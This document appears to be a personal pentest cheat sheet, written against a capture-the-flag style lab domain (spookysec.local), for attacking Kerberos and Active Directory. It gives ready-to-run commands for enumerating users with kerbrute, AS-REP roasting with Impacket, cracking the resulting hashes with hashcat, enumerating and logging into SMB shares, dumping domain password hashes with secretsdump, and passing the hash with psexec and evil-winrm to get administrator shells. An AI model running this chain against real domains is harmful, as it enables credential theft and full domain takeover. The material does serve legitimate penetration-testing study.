# KERBEROS / ACTIVE DIRECTORY

`Kerberos is the authentication service in a AD  
Note that Kerberos runs on port 88`  

## Tools :
- Impacket Suit
- BloodHound
- neo4j
- Enum4linux
- [Kerbrute](https://github.com/ropnop/kerbrute) (Really important here)  
- smbclient

ASREP-Roasting : ASREP-Roasting occurs when a user account has the privilege "Does not require Pre-Authentication" set.

# Methodology
1. Enumerate
2. Look for valid users (userenum tag from kerbrute)
3. Get a ticket from a user to log as him  
	- Usually require valid credentials to KerbeRoast
	- If the privilege "Does not require Pre-auth" is set, then, we can use ASREP-Roasting  



## Enum open ports with nmap -A
Set DNS_Domain_Name (found with nmap -A) in /etc/hosts  

## Enum NetBios 
```bash
use enum4linux
```

## Enum for users via Kerberos
```bash
kerbrute userenum -d spookysec.local --dc IP userlist.txt
```

|Tag | Meaning |
|:-------------|--------------------|
|spookysec.local | the DNS_Domain_Name (found with nmap -A)|
|userlist.txt | a list of usernames|

`Note that service users usually have more permissions than normal user account.  
So, this may be interesting. They often have an identifier such as "svc-" which stands for "service"`

## ASREP-Roasting w/ Impacket
ASREP-Roasting occurs when a user account has the privilege "Does not require Pre-Authentication" set.  
This basically consists of retrieving a Kerberos ticket wich can be cracked like a hash  

`This can be tested one by one like : `  
```bash
python3 /opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.68.12 spookysec.local/svc-admin -no-pass
```
|Tag | Meaning |
|:-------------|--------------------|
|svc-admin | a valid username found previously|
|spookysec.local | the DNS_Domain_Name (found with nmap -A)|
|-no-pass | Meaning that we are Asrep-Roasting|

`But it cans also bruteforce with a userlist`  

```bash
python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/ -userfile userlist.txt
```
## Crack the hash
Found type : Kerberos 5 AS-REP etype 23  
Documentation : [hashcat](./hashcat.md)
```bash
hashcat -a 0 -m 18200 hash /usr/share/wordlists/rockyou.txt
```

## Enum for shares
***Available Tools :*** :
- smbclient
- smbmap
- mount
- smbget
- crackmapexec
```bash
smbclient -L 10.10.72.208 --user svc-admin
```

Or, we can uses smbmap, that looks at permissions too
```bash
smbmap -H spookysec.local -u svc-admin -p password
```
Then, type the password we found earlier  

Or, we can use crackmapexec :  
`Note that sometimes, running with "guest" as user may retrieve stuff`
```bash
crackmapexec smb spookysec.local -u 'svc-admin' -p 'password' --shares
```

## Log into a share w/ smbclient
```bash
smbclient \\\\spookysec.local\\backup --user svc-admin
```
Then, type the password we found earlier  

Or : 
```bash
smbclient \\\\spookysec.local\\backup -Usvc-admin%password
```
`Note that there is no space between -U and svc-admin`


|Tag | Meaning |
|:-------------|--------------------|
|svc-admin | a valid user who nicely gave us his password|




## Enum for additionnal information w/ secretdump.py
``(Admitting that we have a password for the user `backup`)``
Now, we need to retrieve all of the password hashes that this user account has to offer, because we know that it's synced with the Domain Controller and that's why he saved all of them...  
```bash
secretsdump.py -just-dc backup@spookysec.local
```	


## Log in with PsExec by "Passing the hash"
`Note that this is not a vulnerability, this is how kerberos works`
```bash
psexec.py -hashes PUT_THE:HASH_HERE administrator@spookysec.local
get cmd
```

## Log in with Evil-Winrm by "Passing the hash"
/!\ This only needs the second part (NTLM) of the hash  

```bash
evil-winrm -u administrator -H PUT_THE_NT_HASH_HERE -i spookysec.local
get powershell
```

